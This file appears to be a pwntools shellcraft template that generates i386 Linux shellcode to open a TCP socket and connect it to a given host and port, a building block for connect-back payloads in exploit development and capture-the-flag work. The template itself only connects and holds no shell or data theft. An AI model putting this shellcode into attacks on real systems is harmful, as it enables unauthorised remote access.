<% from pwnlib.shellcraft import common %>
<% from pwnlib.shellcraft import i386 %>
<% from socket import htons, inet_aton, gethostbyname %>
<% from pwnlib.util import packing %>

<%page args="host, port"/>
<%docstring>
    Connects to the host on the specified port.
    Leaves the connected socket in ebp
</%docstring>

/* open new socket */
push SYS_socketcall
pop eax
push SYS_socketcall_socket
pop ebx
cdq
push edx
push ebx
push AF_INET
mov ecx, esp
int 0x80

/* save opened socket */
mov ebp, eax

<% ip_addr = gethostbyname(str(host)) %>
/* ${repr(host)} == ${ip_addr} */
${i386.pushstr(inet_aton(ip_addr), False)}

pushw ${htons(port)}
pushw AF_INET
mov ecx, esp
push 0x10
push ecx
push eax
mov ecx, esp
inc ebx
inc ebx
mov al, SYS_socketcall
int 0x80

/* Socket that is maybe connected is in ebp */
